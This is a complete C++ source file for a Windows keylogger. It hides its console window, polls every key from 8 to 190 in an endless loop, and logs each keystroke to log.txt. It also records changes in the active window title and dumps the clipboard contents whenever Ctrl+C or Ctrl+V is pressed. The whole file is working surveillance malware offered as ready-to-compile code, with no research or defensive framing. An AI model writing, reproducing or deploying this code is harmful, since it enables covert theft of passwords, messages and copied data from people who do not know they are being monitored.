#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>

using namespace std;

// Function to log the active window title (wide-char version for Unicode)
void logActiveWindow(const char *file) {
    wchar_t windowTitle[256]; // Use wchar_t for wide characters
    HWND hwnd = GetForegroundWindow(); // Get handle to the active window
    if (hwnd != NULL) {
        int titleLength = GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t)); // Get the window title (wide)

        // Only log if the title is not empty
        if (titleLength > 0) {
            ofstream logfile;
            logfile.open(file, ios::app);
            
            // Convert wide-character string to a narrow-character string
            char buffer[256];
            wcstombs(buffer, windowTitle, sizeof(buffer)); // Convert wide to narrow

            logfile << "\n[Active Window: " << buffer << "]\n"; // Log window title
            logfile.close();
        }
    }
}

// Function to log clipboard contents
void logClipboard(const char *file) {
    // Open the clipboard
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT); // Get clipboard data in text format
        if (hData != NULL) {
            char *clipboardText = static_cast<char*>(GlobalLock(hData)); // Lock the data
            if (clipboardText != NULL) {
                ofstream logfile;
                logfile.open(file, ios::app);
                logfile << "[Clipboard]: " << clipboardText << "\n"; // Log the clipboard text
                logfile.close();
                GlobalUnlock(hData); // Unlock the data
            }
        }
        CloseClipboard(); // Close the clipboard
    }
}

void logKey(int key, const char *file) {
    ofstream logfile;
    logfile.open(file, ios::app);

    // Handle special keys and symbols
    if (key == VK_BACK) {
        logfile << "[BACKSPACE]";
    } else if (key == VK_RETURN) {
        logfile << "\n";
    } else if (key == VK_SPACE) {
        logfile << " ";
    } else if (key == VK_SHIFT) {
        logfile << "[SHIFT]";
    } else if (key == VK_TAB) {
        logfile << "[TAB]";
    } else if (key == VK_ESCAPE) {
        logfile << "[ESC]";
    } else if (key >= '0' && key <= '9') {
        // Handle numbers
        logfile << char(key);
    } else if (key >= VK_NUMPAD0 && key <= VK_NUMPAD9) {
        // Handle numpad numbers
        logfile << char(key - VK_NUMPAD0 + '0');
    } else if (key >= VK_F1 && key <= VK_F12) {
        // Handle function keys
        logfile << "[F" << key - VK_F1 + 1 << "]";
    } else if (key == VK_CONTROL) {
        logfile << "[CTRL]";
    } else if (key == VK_MENU) { // ALT key
        logfile << "[ALT]";
    } else if (key == VK_LEFT) {
        logfile << "[LEFT ARROW]";
    } else if (key == VK_RIGHT) {
        logfile << "[RIGHT ARROW]";
    } else if (key == VK_UP) {
        logfile << "[UP ARROW]";
    } else if (key == VK_DOWN) {
        logfile << "[DOWN ARROW]";
    } else if (key == 'C' && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
        logfile << "[CTRL+C] - ";
        logClipboard(file); // Log clipboard contents when CTRL+C is pressed
    } else if (key == 'V' && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
        logfile << "[CTRL+V] - ";
        logClipboard(file); // Log clipboard contents when CTRL+V is pressed
    } else {
        // Check if shift key is pressed for case sensitivity
        bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        char keyChar = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
        
        // Convert character to lowercase if shift is not pressed and it's a letter
        if (key >= 'A' && key <= 'Z') {
            if (!shiftPressed) {
                keyChar = tolower(keyChar);  // Lowercase if shift is not pressed
            }
        }
        
        // Output the character
        if (keyChar) {
            logfile << keyChar;
        } else {
            logfile << "[UNKNOWN KEY]";
        }
    }

    logfile.close();
}

// Main loop to capture keystrokes and clipboard actions
int main() {
    const char *file = "log.txt";  // File to store log
    wstring lastWindow = L"";  // Track changes in the active window using wstring

    // Hide the console window (optional)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        HWND hwnd = GetForegroundWindow(); // Get handle to the current window
        wchar_t windowTitle[256];
        GetWindowTextW(hwnd, windowTitle, sizeof(windowTitle) / sizeof(wchar_t));

        // Log window title if it has changed
        if (lastWindow != windowTitle) {
            lastWindow = windowTitle;
            logActiveWindow(file);  // Log the new active window
        }

        // Capture and log keystrokes
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logKey(key, file);
            }
        }

        Sleep(10);  // Small delay to reduce CPU usage
    }

    return 0;
}
